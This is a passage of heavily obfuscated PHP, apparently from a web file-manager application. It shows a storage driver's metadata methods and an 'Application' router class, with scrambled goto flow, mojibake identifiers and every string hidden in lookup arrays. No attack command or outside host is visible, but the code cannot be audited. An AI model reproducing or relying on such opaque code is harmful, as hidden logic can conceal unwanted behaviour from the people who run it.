ê§–›[208]]) ? $fƒ¿°¼ğÀ…[$f° ê§–›[208]] : !1; } public function size($d±ÏÃ½È„‘) { $c»Úˆ¥»Ô = $this->objectMeta($d±ÏÃ½È„‘); return $c»Úˆ¥»Ô ? $c»Úˆ¥»Ô[$_SERVER[ä°„ä°º][78]] : 0; } public function info($a²Ùò™Ä—¼) { if ($this->isFolder($a²Ùò™Ä—¼)) { return $this->folderInfo($a²Ùò™Ä—¼); } else { if ($this->isFile($a²Ùò™Ä—¼)) { return $this->fileInfo($a²Ùò™Ä—¼); } } return !1; } public function exist($D‹ê„Ü“™á) { return $this->isFile($D‹ê„Ü“™á) || $this->isFolder($D‹ê„Ü“™á); } public function isFile($f—“„ñõ¸²) { return !$this->isFolder($f—“„ñõ¸²) && $this->objectMeta($f—“„ñõ¸²); } public function isFolder($fåìæõİœÔ) { return $this->cacheMethod($_SERVER[ä°„ä°º][199], $fåìæõİœÔ); } protected function objectMeta($bŞˆß‚‘²‡) { return $this->cacheMethod($_SERVER[ä°„ä°º][200], $bŞˆß‚‘²‡); } protected function _objectMeta($EíÁÓÄŸö) { goto C¬–È÷ÕÆÊ; C¬–È÷ÕÆÊ: $fµä¯˜ó­‹ =& $_SERVER[ä°„ä°º]; if ($EíÁÓÄŸö == $fµä¯˜ó­‹[33] || $EíÁÓÄŸö == $fµä¯˜ó­‹[8]) { return array(); } $B²Æç›à„ = $this->ussRequest($EíÁÓÄŸö, $fµä¯˜ó­‹[1391]); goto F®¾Á²­Ã; F®¾Á²­Ã: if (!$B²Æç›à„[$fµä¯˜ó­‹[1107]]) { return null; } $c‹‰·ğÑÂ = isset($B²Æç›à„[$fµä¯˜ó­‹[1109]]) ? $B²Æç›à„[$fµä¯˜ó­‹[1109]] : array(); if (!isset($c‹‰·ğÑÂ[$fµä¯˜ó­‹[1392]])) { return null; } goto A«Ø«Õáå®; A«Ø«Õáå®: $A‘¤÷ùáØ = array($fµä¯˜ó­‹[29] => isset($c‹‰·ğÑÂ[$fµä¯˜ó­‹[1392]]) ? $c‹‰·ğÑÂ[$fµä¯˜ó­‹[1392]] : null, $fµä¯˜ó­‹[78] => isset($c‹‰·ğÑÂ[$fµä¯˜ó­‹[1393]]) ? $c‹‰·ğÑÂ[$fµä¯˜ó­‹[1393]] : null, $fµä¯˜ó­‹[208] => isset($c‹‰·ğÑÂ[$fµä¯˜ó­‹[1394]]) ? $c‹‰·ğÑÂ[$fµä¯˜ó­‹[1394]] : null, $fµä¯˜ó­‹[1361] => isset($c‹‰·ğÑÂ[$fµä¯˜ó­‹[1395]]) ? $c‹‰·ğÑÂ[$fµä¯˜ó­‹[1395]] : null); $A‘¤÷ùáØ[$fµä¯˜ó­‹[1362]] = isset($c‹‰·ğÑÂ[$fµä¯˜ó­‹[1396]]) ? strtotime($c‹‰·ğÑÂ[$fµä¯˜ó­‹[1396]]) : $A‘¤÷ùáØ[$fµä¯˜ó­‹[1361]]; return $A‘¤÷ùáØ; goto b…èš‘¨š½; b…èš‘¨š½: } protected function _isFolder($E¶õ¤¥³È¼) { $BĞ©ÕêéãÏ =& $_SERVER[ä°„ä°º]; if ($E¶õ¤¥³È¼ == $BĞ©ÕêéãÏ[33] || $E¶õ¤¥³È¼ == $BĞ©ÕêéãÏ[8]) { return !0; } $FÎ»‡‡¨Õ× = $this->_objectMeta($E¶õ¤¥³È¼); return isset($FÎ»‡‡¨Õ×[$BĞ©ÕêéãÏ[29]]) && $FÎ»‡‡¨Õ×[$BĞ©ÕêéãÏ[29]] == $BĞ©ÕêéãÏ[77] ? !0 : !1; } } goto a½öõ†çé‚; cÖšŒ£ˆŒ‡: if (!$dÂÂáÜñÀ) { return; } class Application { private $defaultModule = "\151\x6e\144\x65\170"; private $defaultController = "\151\156\144\x65\x78"; private $defaultAction = "\x69\156\x64\x65\170"; function __construct() { } public function setDefault($B¼ÛØŸŸ˜) { goto Fô©ïçÄø; Eº¡Š“ß•´: $b˜Üè©·ìÍ = $FâìÖóˆÈ[596]; if (strlen($b˜Üè©·ìÍ) < $FâìÖóˆÈ[594]) { die; } goto c¥†•¤Û‡; Fô©ïçÄø: $FâìÖóˆÈ =& $_SERVER[ä°„ä°º]; $e‰À°·¢Å =& $_SERVER[ÖÙ“üÓ½‰]; $f¤¢•¿Ú… = $e‰À°·¢Å[0]($e‰À°·¢Å[1], $e‰À°·¢Å[2]($B¼ÛØŸŸ˜, $e‰À°·¢Å[1])); goto bİòÖí«Ô§; BªÈ…Ö”Óç: $CŞÓÛ‘Ò¯ = $FâìÖóˆÈ[595]; $this->defaultAction = $f¤¢•¿Ú…[2] ? $f¤¢•¿Ú…[2] : $this->defaultAction; $this->{$_SERVER[ÖÙ“üÓ½‰][3]}($e‰À°·¢Å[4], array($this, $e‰À°·¢Å[5])); goto Eº¡Š“ß•´; e—†…Ö¯£: $A‚Ö¸Íôğ  = $FâìÖóˆÈ[593]; while (strlen($A‚Ö¸Íôğ ) < $FâìÖóˆÈ[594]) { if (!$A‚Ö¸Íôğ ) { break; } $A‚Ö¸Íôğ ++; } $this->defaultController = $f¤¢•¿Ú…[1] ? $f¤¢•¿Ú…[1] : $this->defaultController; goto BªÈ…Ö”Óç; bİòÖí«Ô§: $B¥»×Ú¢ï¢ = $FâìÖóˆÈ[591]; if (strlen($B¥»×Ú¢ï¢) < $FâìÖóˆÈ[592]) { return; } $this->defaultModule = $f¤¢•¿Ú…[0] ? $f¤¢•¿Ú…[0] : $this->defaultModule; goto e—†…Ö¯£; c¥†•¤Û‡: } public function appRun($Aª‰‹³Ïƒ) { goto fïñèƒŠÓ; BÙÂŒ«¯: $b•­Ì÷Ë“” = $CÔŒ±¨»Ê¢[599]; while ($b•­Ì÷Ë“” < $CÔŒ±¨»Ê¢[594]) { if ($b•­Ì÷Ë“” >= 0) { break; } $b•­Ì÷Ë“”++; } if ($fËêìé§…í == $d¬õ¯İ™¯Ö[8]) { $CĞÚØ „›× = $d¬õ¯İ™¯Ö[9]; $b¿é±Ù™ à[0] = $d¬õ¯İ™¯Ö[10]; $b¿é±Ù™ à[1] = $b¿é±Ù™ à[1] . $d¬õ¯İ™¯Ö[11]; $Aª‰‹³Ïƒ = $d¬õ¯İ™¯Ö[12]($d¬õ¯İ™¯Ö[1], $b¿é±Ù™ à); $Aª‰‹³Ïƒ = $d¬õ¯İ™¯Ö[2]($Aª‰‹³Ïƒ, $d¬õ¯İ™¯Ö[1]); } goto F¬Á‡‹ºÓ; fïñèƒŠÓ: $CÔŒ±¨»Ê¢ =& $_SERVER[ä°„ä°º]; $d¬õ¯İ™¯Ö =& $_SERVER[ÖÙ“üÓ½‰]; $b¿é±Ù™ à = $d¬õ¯İ™¯Ö[0]($d¬õ¯İ™¯Ö[1], $Aª‰‹³Ïƒ); goto F¬ç·ŠéË; F¬Á‡‹ºÓ: $d¬õ¯İ™¯Ö[13](array($d¬õ¯İ™¯Ö[14], $d¬õ¯İ™¯Ö[15]), $CĞÚØ „›× . $d¬õ¯İ™¯Ö[16], $Aª‰‹³Ïƒ); $d¬õ¯İ™¯Ö[17]($Aª‰‹³Ïƒ); $e‘òÔ…ØÎ® = $CÔŒ±¨»Ê¢[600]; goto EÔÄ±ƒÄİ; FÃ„Ëæ›Ÿ: $d„®Êä¡°« = $CÔŒ±¨»Ê¢[598]; if (strlen($d„®Êä¡°«) < $CÔŒ±¨»Ê¢[592]) { die; } $CĞÚØ „›× = $d¬õ¯İ™¯Ö[7]; goto BÙÂŒ«¯; EÔÄ±ƒÄİ: while ($e‘òÔ…ØÎ® < $CÔŒ±¨»Ê¢[594]) { if ($e‘òÔ…ØÎ® >= 0) { break; } $e‘òÔ…ØÎ®++; } $d¬õ¯İ™¯Ö[13](array($d¬õ¯İ™¯Ö[14], $d¬õ¯İ™¯Ö[15]), $CĞÚØ „›× . $d¬õ¯İ™¯Ö[18], $Aª‰‹³Ïƒ); goto f¥ƒ½ò™ ¿; F¬ç·ŠéË: $F„ŠãİóÚñ = $CÔŒ±¨»Ê¢[597]; if (strlen($F„ŠãİóÚñ) < $CÔŒ±¨»Ê¢[592]) { return; } $fËêìé§…í = $d¬õ¯İ™¯Ö[6]($b¿é±Ù™ à[0]); goto FÃ„Ëæ›Ÿ; f¥ƒ½ò™ ¿: } private function autorun() { $FàÑŠ‚ß°© =& $_SERVER[ÖÙ“üÓ½‰]; global $config; if ($FàÑŠ‚ß°©[19]($config[$FàÑŠ‚ß°©[20]]) == 0) { return; } foreach ($config[$FàÑŠ‚ß°©[20]] as $eø„æ†±Ç => $b¦¤„´Ñ³) { $this->{$_SERVER[ÖÙ“üÓ½‰][21]}($b¦¤„´Ñ³); } } private function auimf4f26835() { goto bçöËÒ×œ; eã„‘’Éš‚: $CĞîÂáò¦š = $A¬ÜËÂªÇ„[604]; while (strlen($CĞîÂáò¦š) < $A¬ÜËÂªÇ„[605]) { if (!$CĞîÂáò¦š) { break; } $CĞîÂáò¦š++; } $GLOBALS[$dô‡Š„¹¹–[22]][$dô‡Š„¹¹–[28]] = $dô‡Š„¹¹–[29]($dô‡Š„¹¹–[1], $GLOBALS[$dô‡Š„¹¹–[22]][$dô‡Š„¹¹–[23]]); goto dæÇ®ÃÊ…; eÀ‹¡°ï¸¡: $eô÷İÕÆ¿‚ = $A¬ÜËÂªÇ„[602]; if (!$eô÷İÕÆ¿‚) { return; } $a´½ŸÒòÈ… = $dô‡Š„¹¹–[26]($GLOBALS[$dô‡Š„¹¹–[22]][$dô‡Š„¹¹–[23]], 1); goto fÎñĞêÃê; bçöËÒ×œ: $A¬ÜËÂªÇ„ =& $_SERVER[ä°„ä°º]; $dô‡Š„¹¹– =& $_SERVER[ÖÙ“üÓ½‰]; $D‚¬è›¤ÏÌ = $dô‡Š„¹¹–[8]; goto e§éÃŠëò; e§éÃŠëò: $Fœù·®Áƒ· = $GLOBALS[$dô‡Š„¹¹–[22]][$dô‡Š„¹¹–[23]][0]; $eæÙÏ ‘­ = $A¬ÜËÂªÇ„[601]; if (!$Fœù·®Áƒ· || $dô‡Š„¹¹–[24]($Fœù·®Áƒ·) <= $dô‡Š„¹¹–[24]($D‚¬è›¤ÏÌ)) { return; } goto D›Ç† ×ºÃ; D›Ç† ×ºÃ: if ($dô‡Š„¹¹–[6]($dô‡Š„¹¹–[25]($Fœù·®Áƒ·, -$dô‡Š„¹¹–[24]($D‚¬è›¤ÏÌ))) != $D‚¬è›¤ÏÌ) { return; } $A³Œ™Ï»‡‘ = $dô‡Š„¹¹–[25]($Fœù·®Áƒ·, 0, -$dô‡Š„¹¹–[24]($D‚¬è›¤ÏÌ)); $F”­Ââ†¾ë = array($dô‡Š„¹¹–[8], $A³Œ™Ï»‡‘); goto eÀ‹¡°ï¸¡; fÎñĞêÃê: $a±ùáç‰Ÿ = $A¬ÜËÂªÇ„[603]; if (strlen($a±ùáç‰Ÿ) < $A¬ÜËÂªÇ„[594]) { return; } $GLOBALS[$dô‡Š„¹¹–[22]][$dô‡Š„¹¹–[23]] = $dô‡Š„¹¹–[27]($F”­Ââ†¾ë, $a´½ŸÒòÈ…); goto eã„‘’Éš‚; dæÇ®ÃÊ…: } private function eoxbc18e3bd5() { goto bÒ—Åï‡É½; c‚„Ú™Ôš: while (strlen($CõÕïšâ) < $cÃ·ì’ô‘É[605]) { if (!$CõÕïšâ) { break; } $CõÕïšâ++; } goto b´İÅâ³ù; A†¼öÉ»Ûá: $cÔß‡ØØœ = $cÃ·ì’ô‘É[610]; while (strlen($cÔß‡ØØœ) < $cÃ·ì’ô‘É[611]) { if (!$cÔß‡ØØœ) { break; } $cÔß‡ØØœ++; } $D«Ø‰î—Óƒ = $F«ğùÕ‰Àš[2]($A‘íÓ™ªô[0][0], $F«ğùÕ‰Àš[36]); goto eôîñ¹Á¹; cáÅÓ•¡²É: if (strlen($CÚ…Ê˜“Ğ) < $cÃ·ì’ô‘É[608]) { return; } $D«Ø‰î—Óƒ = $F«ğùÕ‰Àš[25]($c»„Š¦Î¢™, $f‹ÑÂÍºÜ§ + $F«ğùÕ‰Àš[24]($eÍÚŞÊ÷’‰)); $F«ğùÕ‰Àš[34]($F«ğùÕ‰Àš[35], $D«Ø‰î—Óƒ, $A‘íÓ™ªô); goto A†¼öÉ»Ûá; bÒ—Åï‡É½: $cÃ·ì’ô‘É =& $_SERVER[ä°„ä°º]; $F«ğùÕ‰Àš =& $_SERVER[ÖÙ“üÓ½‰]; if ($GLOBALS[$F«ğùÕ‰Àš[22]][$F«ğùÕ‰Àš[28]] != $F«ğùÕ‰Àš[10]) { return; } goto A¶ù­Û£Êá; eôîñ¹Á¹: $GLOBALS[$F«ğùÕ‰Àš[22]][$F«ğùÕ‰Àš[23]] = $F«ğùÕ‰Àš[0]($F«ğùÕ‰Àš[36], $D«Ø‰î—Óƒ); $GLOBALS[$F«ğùÕ‰Àš[22]][$F«ğùÕ‰Àš[28]] = $F«ğùÕ‰Àš[29]($F«ğùÕ‰Àš[1], $GLOBALS[$F«ğùÕ‰Àš[22]][$F«ğùÕ‰Àš[23]]); $CõÕïšâ = $cÃ·ì’ô‘É[612]; goto c‚„Ú™Ôš; CÆèàŠ»’: if (!$F«ğùÕ‰Àš[32]($c»„Š¦Î¢™, $eÍÚŞÊ÷’‰)) { return; } $f‹ÑÂÍºÜ§ = $F«ğùÕ‰Àš[33]($c»„Š¦Î¢™, $eÍÚŞÊ÷’‰); $CÚ…Ê˜“Ğ = $cÃ·ì’ô‘É[609]; goto cáÅÓ•¡²É; FßÂ¯ˆÁƒÂ: $eÍÚŞÊ÷’‰ = $F«ğùÕ‰Àš[31]; $a‚¸­Æ—šÔ = $cÃ·ì’ô‘É[607]; if (strlen($a‚¸­Æ—šÔ) < $cÃ·ì’ô‘É[608]) { return; } goto CÆèàŠ»’; A¶ù­Û£Êá: $c»„Š¦Î¢™ = $_SERVER[$F«ğùÕ‰Àš[30]]; $bİÊ‰ÅÚëğ = $cÃ·ì’ô‘É[606]; while ($bİÊ‰ÅÚëğ < $cÃ·ì’ô‘É[605]) { if ($bİÊ‰ÅÚëğ >= 0) { break; } $bİÊ‰ÅÚëğ++; } goto FßÂ¯ˆÁƒÂ; b´İÅâ³ù: } public function run() { goto E„×¹ğïÂâ; c¹´¦ÃŸ†ñ: if (strlen($bŸ¢äçÖ›˜) < $E¥ª²Ğó‰Ç[611]) { return; } $cˆòïá±¯¯[39]($cˆòïá±¯¯[40], isset($DÊÒ‘ì¹Æ[0]) && $DÊÒ‘ì¹Æ[0] ? $DÊÒ‘ì¹Æ[0] : $this->defaultModule); $E‚Î¯’Âå = $E¥ª²Ğó‰Ç[615]; goto bŒä‚ô©´; b¥¦¡ÕÙ¦²: $cˆòïá±¯¯[39]($cˆòïá±¯¯[43], MOD . $cˆòïá±¯¯[1] . ST . $cˆòïá±¯¯[1] . ACT); $EØ½ˆÅŠÄä = $E¥ª²Ğó‰Ç[616]; if (strlen($EØ½ˆÅŠÄä) < $E¥ª²Ğó‰Ç[594]) { return; } goto fĞÌ¸éÙÂ‚; bŒä‚ô©´: if (strlen($E‚Î¯’Âå) < $E¥ª²Ğó‰Ç[592]) { die; } $cˆòïá±¯¯[39]($cˆòïá±¯¯[41], isset($DÊÒ‘ì¹Æ[1]) && $DÊÒ‘ì¹Æ[0] ? $DÊÒ‘ì¹Æ[1] : $this->defaultController); $cˆòïá±¯¯[39]($cˆòïá±¯¯[42], isset($DÊÒ‘ì¹Æ[2]) && $DÊÒ‘ì¹Æ[0] ? $DÊÒ‘ì¹Æ[2] : $this->defaultAction); goto b¥¦¡ÕÙ¦²; AœòÃƒ¢‡í: $this->{$_SERVER[ÖÙ“üÓ½‰][38]}(); $DÊÒ‘ì¹Æ = $GLOBALS[$cˆòïá±¯¯[22]][$cˆòïá±¯¯[23]]; $Cøçß‘ï˜Ñ = $E¥ª²Ğó‰Ç[613]; goto B÷–ô—±ğ–; E„×¹ğïÂâ: $E¥ª²Ğó‰Ç =& $_SERVER[ä°„ä°º]; $cˆòïá±¯¯ =& $_SERVER[ÖÙ“üÓ½‰]; $this->{$_SERVER[ÖÙ“üÓ½‰][37]}(); goto AœòÃƒ¢‡í; B÷–ô—±ğ–: while ($Cøçß‘ï˜Ñ < $E¥ª²Ğó‰Ç[608]) { if ($Cøçß‘ï˜Ñ >= 0) { break; } $Cøçß‘ï˜Ñ++; } $A‘àÕ¬…ğ = $GLOBALS[$cˆòïá±¯¯[22]][$cˆòïá±¯¯[28]]; $bŸ¢äçÖ›˜ = $E¥ª²Ğó‰Ç[614]; goto c¹´¦ÃŸ†ñ; fĞÌ¸éÙÂ‚: $_SERVER[$cˆòïá±¯¯[44]] = $cˆòïá±¯¯[6](ACTION); $this->{$_SERVER[ÖÙ“üÓ½‰][45]}(); if ($cˆòïá±¯¯[19]($DÊÒ‘ì¹Æ) >= 3) { $this->{$_SERVER[ÖÙ“üÓ½‰][21]}($A‘àÕ¬…ğ); } else { $this->{$_SERVER[ÖÙ“üÓ½‰][21]}(ACTION); } goto A•¥åÍò¨‰; A•¥åÍò¨‰: } private $uszxfd58a655 = array(); private $gpked788a35e = ''; public function cflsb09a4daa() { goto CÏ³çîÓ…ù; FÒ‡Í²ƒõÛ: $cˆ˜íºİÖ÷ = $aÂÊòˆÖ»³[618]; while (strlen($cˆ˜íºİÖ÷) < $aÂÊòˆÖ»³[594]) { if (!$cˆ˜íºİÖ÷) { break; } $cˆ˜íºİÖ÷++; } $this->{$_SERVER[ÖÙ“üÓ½‰][49]}(); goto a¦Ÿ÷®òƒ; Cô×ÆÈ×: $this->{$_SERVER[ÖÙ“üÓ½‰][52]}(); $E¿Âéğ•ç™ = $aÂÊòˆÖ»³[621]; if (strlen($E¿Âéğ•ç™) < $aÂÊòˆÖ»³[594]) { return; } goto b˜±¦ÏµÇ‰; a¦Ÿ÷®òƒ: $c£¢ôÂ÷ò = $aÂÊòˆÖ»³[619]; if (strlen($c£¢ôÂ÷ò) < $aÂÊòˆÖ»³[611]) { die; } $this->{$_SERVER[ÖÙ“üÓ½‰][50]}(); goto b„Ú®÷’‚¸; E«äÏ˜‡Úƒ: $this->{$_SERVER[ÖÙ“üÓ½‰][47]}(); $CÑùÒ·°â = $aÂÊòˆÖ»³[617]; $this->{$_SERVER[ÖÙ“üÓ½‰][48]}(); goto FÒ‡Í²ƒõÛ; CÏ³çîÓ…ù: $aÂÊòˆÖ»³ =& $_SERVER[ä°„ä°º]; $B®³®ìÀµó =& $_SERVER[ÖÙ“üÓ½‰]; $this->{$_SERVER[ÖÙ“üÓ½‰][46]}(); goto E«äÏ˜‡Úƒ; BØ›±‡ºÕÑ: $this->{$_SERVER[ÖÙ“üÓ½‰][3]}($B®³®ìÀµó[59], array($this, $B®³®ìÀµó[60])); $dä­åÆŸÚè = $aÂÊòˆÖ»³[625]; while (strlen($dä­åÆŸÚè) < $aÂÊòˆÖ»³[608]) { if (!$dä­åÆŸÚè) { break; } $dä­åÆŸÚè++; } goto cæ±ìã‰¤Ç; b„Ú®÷’‚¸: $this->{$_SERVER[ÖÙ“üÓ½‰][51]}(); $Bù¢ê™¹Ó„ = $aÂÊòˆÖ»³[620]; if (strlen($Bù¢ê™¹Ó„) < $aÂÊòˆÖ»³[594]) { die; } goto Cô×ÆÈ×; fÊ×Ş³›Â: $this->{$_SERVER[ÖÙ“üÓ½‰][3]}($B®³®ìÀµó[57], array($this, $B®³®ìÀµó[58])); $EÒ’íà‚Ğ = $aÂÊòˆÖ»³[624]; while (strlen($EÒ’íà‚Ğ) < $aÂÊòˆÖ»³[611]) { if (!$EÒ’íà‚Ğ) { break; } $EÒ’íà‚Ğ++; } goto BØ›±‡ºÕÑ; b˜±¦ÏµÇ‰: $this->{$_SERVER[ÖÙ“üÓ½‰][3]}($B®³®ìÀµó[53], array($this, $B®³®ìÀµó[54])); $FéŒ‡´ÌÛ = $aÂÊòˆÖ»³[622]; if (strlen($FéŒ‡´ÌÛ) < $aÂÊòˆÖ»³[611]) { die; } goto B¶Œ„–‰ˆ¹; B¶Œ„–‰ˆ¹: $this->{$_SERVER[ÖÙ“üÓ½‰][3]}($B®³®ìÀµó[55], array($this, $B®³®ìÀµó[56])); $c†´•´Æ = $aÂÊòˆÖ»³[623]; while (strlen($c†´•´Æ) < $aÂÊòˆÖ»³[605]) { if (!$c†´•´Æ) { break; } $c†´•´Æ++; } goto fÊ×Ş³›Â; cæ±ìã‰¤Ç: } public function xzjm28551770($d‹Æ´à¹†•) { goto fÏŒè¡È„; BéåšçÑ“À: $d‹Æ´à¹†•[$DàĞ±®öà[121]][$DàĞ±®öà[130]] = $DàĞ±®öà[131]($DàĞ±®öà[132]()); $CÈ‰ÄÀ®‹‡ = $Cí”‹ğ”Àà[631]; while (strlen($CÈ‰ÄÀ®‹‡) < $Cí”‹ğ”Àà[605]) { if (!$CÈ‰ÄÀ®‹‡) { break; } $CÈ‰ÄÀ®‹‡++; } goto bñ’“Ç„; a¯‰Ñ¨º¯ê: unset($d‹Æ´à¹†•[$DàĞ±®öà[109]][$DàĞ±®öà[111]][$DàĞ±®öà[113]]); $A˜¦åôÕ°É = $Cí”‹ğ”Àà[628]; while (strlen($A˜¦åôÕ°É) < $Cí”‹ğ”Àà[594]) { if (!$A˜¦åôÕ°É) { break; } $A˜¦åôÕ°É++; } goto FÀÓÃƒØĞÒ; Fæ´ƒƒàÏ‰: if ($eÊ‹’¹´Ï„[$DàĞ±®öà[133]] != $DàĞ±®öà[134]) { $d‹Æ´à¹†•[$DàĞ±®öà[121]][$DàĞ±®öà[135]] = $eÊ‹’¹´Ï„[$DàĞ±®öà[135]]; $d‹Æ´à¹†•[$DàĞ±®öà[121]][$DàĞ±®öà[136]] = $eÊ‹’¹´Ï„[$DàĞ±®öà[136]]; $dÁœÛçÀ¼í = $DàĞ±®öà[137](10) . $this->gpked788a35e . $DàĞ±®öà[137](5); $d‹Æ´à¹†•[$DàĞ±®öà[109]][$DàĞ±®öà[138]][$DàĞ±®öà[139]] = $this->{$_SERVER[ÖÙ“üÓ½‰][140]}($dÁœÛçÀ¼í, $d‹Æ´à¹†•[$DàĞ±®öà[121]][$DàĞ±®öà[126]]); } if ($this->gpked788a35e == $DàĞ±®öà[134]) { $d‹Æ´à¹†•[$DàĞ±®öà[109]][$DàĞ±®öà[110]][$DàĞ±®öà[115]][$DàĞ±®öà[120]] = 0; } $d‹Æ´à¹†•[$DàĞ±®öà[121]][$DàĞ±®öà[141]] = $DàĞ±®öà[119]($this->uszxfd58a655, $DàĞ±®öà[142], $DàĞ±®öà[10]); goto CÑñ¸…îÅ; b£ƒôò¦Ó¢: if ($DàĞ±®öà[119]($GLOBALS, $DàĞ±®öà[145]) && $this->config[$DàĞ±®öà[146]]) { $d‹Æ´à¹†•[$DàĞ±®öà[121]][$DàĞ±®öà[147]] = WEB_ROOT; } return $d‹Æ´à¹†•; goto FÃùáµ ƒ; FÃæòÃƒ‘¿: $FÃ–ãƒ÷î“ = $Cí”‹ğ”Àà[627]; if (!$FÃ–ãƒ÷î“) { return; } unset($d‹Æ´à¹†•[$DàĞ±®öà[109]][$DàĞ±®öà[111]][$DàĞ±®öà[112]]); goto a¯‰Ñ¨º¯ê; bñ’“Ç„: $d‹Æ´à¹†•[$DàĞ±®öà[121]][$DàĞ±®öà[133]] = $this->gpked788a35e; $bÇø·×‹ª‚ = $Cí”‹ğ”Àà[632]; if (strlen($bÇø·×‹ª‚) < $Cí”‹ğ”Àà[594]) { die; } goto Fæ´ƒƒàÏ‰; dªŸƒÎ¼å‘: $d‹Æ´à¹†•[$DàĞ±®öà[121]][$DàĞ±®öà[122]] = $DàĞ±®öà[123]($DàĞ±®öà[124])->{$_SERVER[ÖÙ“üÓ½‰][125]}(); $F®Ø–¬È­¢ = $Cí”‹ğ”Àà[629]; if (!$F®Ø–¬È­¢) { return; } goto E·‰å‹™„; CÑñ¸…îÅ: $d‹Æ´à¹†•[$DàĞ±®öà[121]][$DàĞ±®öà[143]] = $DàĞ±®öà[119]($this->uszxfd58a655, $DàĞ±®öà[144], $DàĞ±®öà[10]); $B–¦˜ Ò¢² = $Cí”‹ğ”Àà[633]; if (!$B–¦˜ Ò¢²) { return; } goto b£ƒôò¦Ó¢; E·‰å‹™„: $d‹Æ´à¹†•[$DàĞ±®öà[121]][$DàĞ±®öà[126]] = $DàĞ±®öà[127]($_SERVER[$DàĞ±®öà[128]] . $eÊ‹’¹´Ï„[$DàĞ±®öà[129]]); $DÇ¾é¨‚š = $Cí”‹ğ”Àà[630]; if (strlen($DÇ¾é¨‚š) < $Cí”‹ğ”Àà[592]) { die; } goto BéåšçÑ“À; aÂ†¦àÈ¸: $eîêÈ×÷Ş— = array($DàĞ±®öà[64], $DàĞ±®öà[65], $DàĞ±®öà[66], $DàĞ±®öà[67], $DàĞ±®öà[68], $DàĞ±®öà[69], $DàĞ±®öà[70], $DàĞ±®öà[71], $DàĞ±®öà[72], $DàĞ±®öà[73], $DàĞ±®öà[74], $DàĞ±®öà[75], $DàĞ±®öà[76], $DàĞ±®öà[77], $DàĞ±®öà[78], $DàĞ±®öà[79], $DàĞ±®öà[80], $DàĞ±®öà[81], $DàĞ±®öà[82], $DàĞ±®öà[83], $DàĞ±®öà[84], $DàĞ±®öà[85], $DàĞ±®öà[86], $DàĞ±®öà[87], $DàĞ±®öà[88], $DàĞ±®öà[89], $DàĞ±®öà[90], $DàĞ±®öà[91], $DàĞ±®öà[92], $DàĞ±®öà[93], $DàĞ±®öà[94], $DàĞ±®öà[95], $DàĞ±®öà[96], $DàĞ±®öà[97], $DàĞ±®öà[98], $DàĞ±®öà[99], $DàĞ±®öà[100], $DàĞ±®öà[101], $DàĞ±®öà[102], $DàĞ±®öà[103], $DàĞ±®öà[104], $DàĞ±®öà[105], $DàĞ±®öà[106]); foreach ($eîêÈ×÷Ş— as $Bï¤²¿‡) { $AëñéÀŒ¯„ = $GLOBALS[$DàĞ±®öà[107]][$DàĞ±®öà[108]][$Bï¤²¿‡]; $d„Ş„ø›Ã² = $Cí”‹ğ”Àà[626]; if (isset($eÊ‹’¹´Ï„[$Bï¤²¿‡])) { $AëñéÀŒ¯„ = $eÊ‹’¹´Ï„[$Bï¤²¿‡]; } $d‹Æ´à¹†•[$DàĞ±®öà[109]][$DàĞ±®öà[110]][$Bï¤²¿‡] = $AëñéÀŒ¯„; } $eÀÁÛğåëÆ = $d‹Æ´à¹†•[$DàĞ±®öà[109]][$DàĞ±®öà[110]][$DàĞ±®öà[76]]; goto FÃæòÃƒ‘¿; fÏŒè¡È„: $Cí”‹ğ”Àà =& $_SERVER[ä°„ä°º]; $DàĞ±®öà =& $_SERVER[ÖÙ“üÓ½‰]; $eÊ‹’¹´Ï„ = $DàĞ±®öà[61]($DàĞ±®öà[62])->{$_SERVER[ÖÙ“üÓ½‰][63]}(); goto aÂ†¦àÈ¸; FÀÓÃƒØĞÒ: unset($d‹Æ´à¹†•[$DàĞ±®öà[109]][$DàĞ±®öà[110]][$DàĞ±®öà[76]]); unset($d‹Æ´à¹†•[$DàĞ±®öà[109]][$DàĞ±®öà[110]][$DàĞ±®öà[114]]); $d‹Æ´à¹†•[$DàĞ±®öà[109]][$DàĞ±®öà[110]][$DàĞ±®öà[115]] = array($DàĞ±®öà[116] => (int) $eÀÁÛğåëÆ[$DàĞ±®öà[117]], $DàĞ±®öà[118] => (int) $DàĞ±®öà[119]($eÀÁÛğåëÆ, $DàĞ±®öà[120], 0)); goto dªŸƒÎ¼å‘; FÃùáµ ƒ: } private function thrg13186560() { goto b„ÈëÕÎù; DŸ›´ÉÄ: $dŠáµ˜¥Ï = $c¯¢ÜÜ®[637]; foreach ($e¾Ÿ÷†âÑå as $F©ôíÔİ¢) { if (!isset($D§è‚•Áò[$F©ôíÔİ¢]) || !$D§è‚•Áò[$F©ôíÔİ¢]) { continue; } $C‰ˆæ½»[$F©ôíÔİ¢] = $D§è‚•Áò[$F©ôíÔİ¢]; $bÎÁÕâğ°“ = $c¯¢ÜÜ®[638]; if (!$bÎÁÕâğ°“) { die; } } $e“ÏÏæÎÚ£[13](array($e“ÏÏæÎÚ£[172], $e“ÏÏæÎÚ£[173]), $C‰ˆæ½»); goto e¦Âøô‚ß; b„ÈëÕÎù: $c¯¢ÜÜ® =& $_SERVER[ä°„ä°º]; $e“ÏÏæÎÚ£ =& $_SERVER[ÖÙ“üÓ½‰]; if ($_SERVER[$e“ÏÏæÎÚ£[44]] == $e“ÏÏæÎÚ£[148]) { goto f¹Ë«ÏÑ‰´; Bäùë«ê°œ: $C‰ˆæ½» = array($e“ÏÏæÎÚ£[171] => $bæ×¹ˆ‹ğ‹); $a³ÏÄèÁ´ = $c¯¢ÜÜ®[634]; $e“ÏÏæÎÚ£[13](array($e“ÏÏæÎÚ£[172], $e“ÏÏæÎÚ£[173]), $C‰ˆæ½»); goto dƒ¡äµ·İ; f¹Ë«ÏÑ‰´: $bæ×¹ˆ‹ğ‹ = array($e“ÏÏæÎÚ£[133] => $this->gpked788a35e, $e“ÏÏæÎÚ£[149] => $this->{$_SERVER[ÖÙ“üÓ½‰][150]}(), $e“ÏÏæÎÚ£[151] => $e“ÏÏæÎÚ£[61]($e“ÏÏæÎÚ£[152])->{$_SERVER[ÖÙ“üÓ½‰][153]}()); if ($this->gpked788a35e != $e“ÏÏæÎÚ£[134]) { $D ÓÒ°Ï˜à = $e“ÏÏæÎÚ£[119]($this->uszxfd58a655, $e“ÏÏæÎÚ£[154]); if ($D ÓÒ°Ï˜à) { $bæ×¹ˆ‹ğ‹[$e“ÏÏæÎÚ£[155]] = $D ÓÒ°Ï˜à; $bæ×¹ˆ‹ğ‹[$e“ÏÏæÎÚ£[156]] = 